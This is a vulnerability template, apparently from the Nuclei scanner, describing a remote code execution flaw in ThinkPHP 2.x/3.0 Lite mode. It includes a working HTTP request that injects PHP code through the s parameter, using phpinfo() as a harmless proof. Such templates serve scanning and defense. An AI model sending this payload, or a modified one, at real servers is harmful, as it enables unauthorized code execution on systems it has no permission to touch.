# Nuclei Template: ThinkPHP 2/3 - Remote Code Execution
**Template ID:** thinkphp-2-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-95
**Source:** Nuclei Template (`thinkphp-2-rce.yaml`)

## Vulnerability Information & PoC

## Description
ThinkPHP 2.x and 3.0 in Lite mode are susceptible to remote code execution via the s parameter. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```

## References
- https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce
